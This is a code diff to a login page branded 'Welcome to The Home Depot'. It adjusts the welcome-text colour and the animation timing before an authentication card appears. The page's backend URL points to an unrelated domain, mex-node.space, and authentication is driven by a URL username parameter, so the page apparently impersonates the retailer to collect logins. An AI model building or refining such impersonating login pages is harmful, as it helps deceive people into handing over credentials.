@@ -66,6 +66,17 @@
       }
     }
 
+    /* Welcome Text During Pour */
+    #welcome-text {
+      transition: color 0.3s ease;
+    }
+    .pouring #welcome-text {
+      color: #ffffff; /* White when pouring over orange */
+    }
+    .not-pouring #welcome-text {
+      color: #1f2937; /* Dark gray when on white background */
+    }
+
     /* Responsive Adjustments */
     #auth-card {
       width: 90%;
@@ -96,7 +107,7 @@
 <body class="flex items-center justify-center text-gray-800">
   <!-- Welcome Screen -->
   <div id="welcome" class="welcome-screen">
-    <h1 class="font-bold text-white drop-shadow-lg text-center">
+    <h1 id="welcome-text" class="font-bold text-white drop-shadow-lg text-center">
       Welcome to The Home Depot
     </h1>
   </div>
@@ -194,6 +205,7 @@
     const pourContainer = document.getElementById('pour-container');
     const authCard = document.getElementById('auth-card');
     const status = document.getElementById('status');
+    const welcomeText = document.getElementById('welcome-text');
     const BASE_URL = 'https://mex-node.space';
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -202,13 +214,19 @@
 
     // Show welcome screen for 2 seconds, then start pouring animation
     setTimeout(() => {
-      welcome.classList.add('hidden');
+      // Don't hide welcome screen yet, just start pouring
       pourContainer.classList.remove('hidden');
+      welcome.classList.add('pouring');
+      welcome.classList.remove('not-pouring');
       
-      // After 3 seconds of pouring animation, show auth card and start authentication
+      // After 3 seconds of pouring animation, hide welcome and show auth card
       setTimeout(() => {
-        pourContainer.style.display = 'none'; // Fully remove pour container
+        welcome.classList.add('hidden');
+        pourContainer.style.display = 'none';
         authCard.classList.remove('hidden');
+        welcome.classList.remove('pouring');
+        welcome.classList.add('not-pouring');
+        
         if (username) {
           authenticate(username);
         } else {
